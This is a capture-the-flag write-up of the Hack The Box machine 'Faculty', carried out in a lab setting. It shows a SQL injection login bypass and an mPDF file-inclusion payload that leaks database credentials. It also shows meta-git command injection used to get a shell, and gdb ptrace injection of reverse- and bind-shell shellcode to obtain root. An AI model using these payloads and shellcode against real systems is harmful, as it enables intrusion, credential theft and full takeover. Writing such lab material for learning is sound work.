---
layout: post
title: "HTB: Faculty"
box: faculty
img: /img/faculty/faculty
author: Andrew Cherney
date: 2024-08-01
tags: htb medium-box linux webapp sqli lfi sudo capabilities gdb
icon: "assets/icons/faculty.png"
post_description: "Another old box that I needed to rehack to post. Starts off with a simple webapp vulnerability into SQL injection to gain access to the admin dashboard. Once there the library creating PDFs can be exploited for LFI to leak the database credentials. Those credentials are shared with a user on the machine and with that foothold sudo can be used to pivot to developer. ptrace the capability is present on gdb and allows us to attach to a root process and inject a shell into memory, pwning the box."
---

# Summary

{{ page.post_description }}

# Enumeration

```bash
nmap -p- 10.10.11.169

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http


nmap -p22,80 -sC -sV 10.10.11.169

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 (RSA)
|   256 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d (ECDSA)
|_  256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: School Faculty Scheduling System
|_Requested resource was login.php
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## SQLi

```bash
dirsearch -u http://faculty.htb

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/raccoon/_hacking/HackTheBox/Retired/Faculty/reports/http_faculty.htb/_24-04-04_02-15-45.txt

Target: http://faculty.htb/

[02:15:45] Starting: 
[02:16:07] 301 -  178B  - /admin  ->  http://faculty.htb/admin/
[02:16:08] 302 -   14KB - /admin/  ->  login.php
[02:16:09] 200 -   17B  - /admin/download.php
[02:16:09] 200 -    3KB - /admin/home.php
[02:16:09] 302 -   14KB - /admin/index.php  ->  login.php
[02:16:09] 200 -    5KB - /admin/login.php
[02:16:56] 200 -    3KB - /header.php
[02:17:07] 200 -    5KB - /login.php
[02:17:41] 500 -    0B  - /test.php
```

![front page 80]({{ page.img }}_front_page.png)

I poked around the other endpoints and didn't see anything worthwhile. Onto the id input field here, I through a stray quote to quick test for an error.

![burpsuite ID test]({{ page.img }}_burp_id.png)

This is an easy `1' or 1='1` moment.

![successful login]({{ page.img }}_calendar.png)

So the initial landing page here is the calendar view, but when traversing to /admin my session cookie must grant me access and I have full reigns of the admin endpoint.

![admin dashboard]({{ page.img }}_admin_dashboard.png)

I test some simple exploits such as XSS and find a way to get it, but in this case since XSS is only as valuable as the javascript executed within the application there is no good use to gain a foothold with it.

![subject xss success]({{ page.img }}_subject_XSS.png)

# Foothold as gbyolo

## mPDF LFI

I turn my attention to the pdf button. Generating pdfs can happen in a variety of ways, I downloaded the pdf and checked the metadata to determine what was creating it. 


```bash
exiftool OKFewrDL0oQmiCAaXM4P5tzKSO.pdf 

ExifTool Version Number         : 12.16
File Name                       : OKFewrDL0oQmiCAaXM4P5tzKSO.pdf
Directory                       : .
File Size                       : 1781 bytes
File Modification Date/Time     : 2024:08:01 15:43:11-05:00
File Access Date/Time           : 2024:08:01 15:43:11-05:00
File Inode Change Date/Time     : 2024:08:01 15:46:39-05:00
File Permissions                : rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Page Layout                     : OneColumn
Producer                        : mPDF 6.0
Create Date                     : 2024:08:01 21:42:54+01:00
Modify Date                     : 2024:08:01 21:42:54+01:00
```

mPDF 6.0 is making the pdf. Searching I found [this LFI exploit affecting mPDF 7.0](https://www.exploit-db.com/exploits/50995). Within the request to make the pdf it sends all the data from the page within a packet we control as seen below. That parameter is double url encoded then base64 encoded. If we add an attachment for a local file into the field instead the pdf generated will allow us to download that local file (as an attachment).

![pdf post request]({{ page.img }}_pdf_burp.png)

I'll test this with passwd first. 

```
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />

JTNDYW5ub3RhdGlvbiUyMGZpbGUlM0QlMjIvZXRjL3Bhc3N3ZCUyMiUyMGNvbnRlbnQlM0QlMjIvZXRjL3Bhc3N3ZCUyMiUyMGljb24lM0QlMjJHcmFwaCUyMiUyMHRpdGxlJTNEJTIyQXR0YWNoZWQlMjBGaWxlJTNBJTIwL2V0Yy9wYXNzd2QlMjIlMjBwb3MteCUzRCUyMjE5NSUyMiUyMC8lM0U=
```

![attachments on pdf]({{ page.img }}_pdf_attachments.png)

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
postfix:x:113:119::/var/spool/postfix:/usr/sbin/nologin
developer:x:1001:1002:,,,:/home/developer:/bin/bash
usbmux:x:114:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
```

Awesome now with LFI I can peruse around the site for further information or leads. ajax.php was the file being posted with the pdf request so we'll start there.

```php
<?php
ob_start();
$action = $_GET['action'];
include 'admin_class.php';
$crud = new Action();
if($action == 'login'){
	$login = $crud->login();
	if($login)
		echo $login;
}
if($action == 'login_faculty'){
	$login_faculty = $crud->login_faculty();
	if($login_faculty)
		echo $login_faculty;
}
...
```

This is a basic API functionality script. Onto admin_class.php

```php
<?php
session_start();
ini_set('display_errors', 1);
Class Action {
	private $db;

	public function __construct() {
		ob_start();
   	include 'db_connect.php';
    
    $this->db = $conn;
	}
	function __destruct() {
	    $this->db->close();
	    ob_end_flush();
	}
...
```

That might have a password of some kind. 

```php
<?php 

$conn= new mysqli('localhost','sched','Co.met06aci.dly53ro.per','scheduling_db')or die("Could not connect to mysql".mysqli_error($con));
```

Bingo a password, time to check against the 2 users we know for the machine: developer and gbyolo.

```bash
sshpass -p 'Co.met06aci.dly53ro.per' ssh gbyolo@faculty.htb
...
gbyolo@faculty:~$
```

# User as developer

## sudo -u developer

```bash
gbyolo@faculty:~$ sudo -l
[sudo] password for gbyolo: 
Matching Defaults entries for gbyolo on faculty:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User gbyolo may run the following commands on faculty:
    (developer) /usr/local/bin/meta-git
gbyolo@faculty:~$ ls -al /usr/local/bin/meta-git
lrwxrwxrwx 1 root root 41 Nov 10  2020 /usr/local/bin/meta-git -> ../lib/node_modules/meta-git/bin/meta-git
gbyolo@faculty:~$ groups
gbyolo
```

meta-git in certain versions is vulnerable to command injection through the branch name. Format of this exploit would be `meta-git clone 'name||touch pwned'`. Advisory on Github for that can be found here: [https://github.com/advisories/GHSA-qcff-ffx3-m25c](https://github.com/advisories/GHSA-qcff-ffx3-m25c).

Notable here there is some mail eluding to running meta-git:

```bash
gbyolo@faculty:~$ ls /var/mail
gbyolo
gbyolo@faculty:~$ cat /var/mail/gbyolo 
From developer@faculty.htb  Tue Nov 10 15:03:02 2020
Return-Path: <developer@faculty.htb>
X-Original-To: gbyolo@faculty.htb
Delivered-To: gbyolo@faculty.htb
Received: by faculty.htb (Postfix, from userid 1001)
	id 0399E26125A; Tue, 10 Nov 2020 15:03:02 +0100 (CET)
Subject: Faculty group
To: <gbyolo@faculty.htb>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20201110140302.0399E26125A@faculty.htb>
Date: Tue, 10 Nov 2020 15:03:02 +0100 (CET)
From: developer@faculty.htb
X-IMAPbase: 1605016995 2
Status: O
X-UID: 1

Hi gbyolo, you can now manage git repositories belonging to the faculty group. Please check and if you have troubles just let me know!\ndeveloper@faculty.htb
```

```bash
gbyolo@faculty:~$ /usr/local/bin/meta-git clone 'raccoon||touch /tmp/poc'
meta git cloning into 'raccoon||touch /tmp/poc' at poc

poc:
fatal: repository 'raccoon' does not exist
poc ✓
(node:46358) UnhandledPromiseRejectionWarning: Error: ENOTDIR: not a directory, chdir '/home/gbyolo/poc'
    at process.chdir (internal/process/main_thread_only.js:31:12)
    at exec (/usr/local/lib/node_modules/meta-git/bin/meta-git-clone:27:11)
    at execPromise.then.catch.errorMessage (/usr/local/lib/node_modules/meta-git/node_modules/meta-exec/index.js:104:22)
    at process._tickCallback (internal/process/next_tick.js:68:7)
    at Function.Module.runMain (internal/modules/cjs/loader.js:834:11)
    at startup (internal/bootstrap/node.js:283:19)
    at bootstrapNodeJSCore (internal/bootstrap/node.js:623:3)
(node:46358) UnhandledPromiseRejectionWarning: Unhandled promise rejection. This error originated either by throwing inside of an async function without a catch block, or by rejecting a promise which was not handled with .catch(). (rejection id: 1)
(node:46358) [DEP0018] DeprecationWarning: Unhandled promise rejections are deprecated. In the future, promise rejections that are not handled will terminate the Node.js process with a non-zero exit code.
gbyolo@faculty:~$ ls -al /tmp/poc
-rw-rw-r-- 1 gbyolo gbyolo 0 Aug  1 23:30 /tmp/poc
```

Looks like this version is vulnerable. Now to use sudo and run a simple bash shell.


```bash
gbyolo@faculty:/tmp$ nano shell.sh
gbyolo@faculty:/tmp$ sudo -u developer meta-git clone 'raccoon||bash shell.sh'
meta git cloning into 'raccoon||bash shell.sh' at raccoon||bash shell.sh

raccoon||bash shell.sh:
fatal: destination path 'raccoon' already exists and is not an empty directory.
```

```bash
nc -nvlp 7777
Listening on 0.0.0.0 7777
Connection received on 10.10.11.169 49008
developer@faculty:/tmp$ cd ~
cd ~
developer@faculty:~$ cat user    
cat user.txt 
7d39b7b6b58e7-------------------
```

# Root

## Capabilities and gdb

```bash
developer@faculty:/tmp$ groups
groups
developer debug faculty
developer@faculty:/tmp$ find / -group debug 2>/dev/null
find / -group debug 2>/dev/null
/usr/bin/gdb
developer@faculty:/tmp$ getcap /usr/bin/gdb 
getcap /usr/bin/gdb 
/usr/bin/gdb = cap_sys_ptrace+ep
```

The ptrace capability here allows the affected script to attach to other processes and trace their system calls. With gdb it should allow us to attach to a root process and inject into its memory a shell. I started trying a regular shell but ended up using a bind shell after some testing. 

[https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_ptrace](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_ptrace) has more about creating a payload. The payload generator is pasted below, change the top buf variable to be the bind shell [https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128). 

```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (8 - len(buf) % 8 ) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
	chunk = payload[i:i+8][::-1]
	chunks = "0x"
	for byte in chunk:
		chunks += f"{byte:02x}"

	print(f"set {{long}}($rip+{i}) = {chunks}")
```

After inserting my bind shell payload and adding some no-op (NOP) bytes at the start the resulting script generates:

```
set {long}($rip+0) = 0x9090909090909090
set {long}($rip+8) = 0x48d23148c0314890
set {long}($rip+16) = 0x6a58296ac6fff631
set {long}($rip+24) = 0x026a9748050f5f02
set {long}($rip+32) = 0x54e015022444c766
set {long}($rip+40) = 0x5a106a58316a525e
set {long}($rip+48) = 0x050f58326a5e050f
set {long}($rip+56) = 0x6a9748050f582b6a
set {long}($rip+64) = 0x050f21b0ceff5e03
set {long}($rip+72) = 0x2fbb4852e6f7f875
set {long}($rip+80) = 0x5368732f2f6e6962
set {long}($rip+88) = 0x050f3bb0243c8d48
```

Next we'll need a target to inject into. I find a file /root/service_chech.sh that seems like a perfect candidate.

```bash
developer@faculty:/tmp$ /usr/bin/gdb -p 48697
/usr/bin/gdb -p 48697
Attaching to process 48697
Reading symbols from /usr/bin/bash...
(No debugging symbols found in /usr/bin/bash)
Reading symbols from /lib64/ld-linux-x86-64.so.2...
Reading symbols from /usr/lib/debug/.build-id/45/87364908de169dec62ffa538170118c1c3a078.debug...
0x00007f44951b5c3a in _start () from /lib64/ld-linux-x86-64.so.2
(gdb) set {long}($rip+0) = 0x9090909090909090
set {long}($rip+8) = 0x48d23148c0314890
set {long}($rip+16) = 0x6a58296ac6fff631
set {long}($rip+24) = 0x026a9748050f5f02
set {long}($rip+32) = 0x54e015022444c766
set {long}($rip+40) = 0x5a106a58316a525e
set {long}($rip+48) = 0x050f58326a5e050f
set {long}($rip+56) = 0x6a9748050f582b6a
set {long}($rip+64) = 0x050f21b0ceff5e03
set {long}($rip+72) = 0x2fbb4852e6f7f875
set {long}($rip+80) = 0x5368732f2f6e6962
set {long}($rip+88) = 0x050f3bb0243c8d48(gdb) (gdb) (gdb) (gdb) (gdb) (gdb) (gdb) (gdb) (gdb) (gdb) (gdb) (gdb) c
Numeric constant too large.
(gdb) c
Continuing.
```

Now in another session I will check port 5600 for the bind shell and nc into it if it's there.

```bash
developer@faculty:/tmp$ netstat -tunlp
netstat -tunlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:5600            0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
developer@faculty:/tmp$ nc 127.0.0.1 5600
nc 127.0.0.1 5600
whoami
root
cat /root/root.txt
52a1e30083d1--------------------
```

